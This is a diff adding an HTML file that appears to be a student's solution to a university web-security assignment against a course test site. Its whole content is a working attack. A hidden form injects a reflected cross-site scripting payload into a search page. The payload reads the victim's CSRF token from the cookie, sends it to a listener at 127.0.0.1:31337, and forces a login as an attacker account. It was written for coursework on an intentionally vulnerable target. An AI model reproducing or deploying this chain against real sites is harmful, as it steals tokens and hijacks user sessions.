@@ -1,0 +1,21 @@
+<!--Lucie Mugnier U87775286-->
+
+<iframe name='hider' style='display:none'></iframe>
+<form id = 'xss_form' action='http://cs558web.bu.edu/project2/search' style='display:none' method='GET' target='hider'>
+	<input name='csrfdefense' value=1>
+	<input name='xssdefense' value=0>
+	<input id = 'q' name='q'>
+</form>
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+	function payload()
+	{
+		var cookie = (document.cookie.split('srf_token=')[1]).substring(0, 32);
+		$.get('http://127.0.0.1:31337', {csrf_token : cookie});
+		$.post('http://cs558web.bu.edu/project2/login', {username: 'attacker', password: 'l33th4x', csrf_token: cookie});
+	}
+	var xss =  "<script" + ">" + payload.toString() + "; payload();</script" + ">";
+	document.getElementById("q").value = xss
+	$('#xss_form').submit();
+</script> 
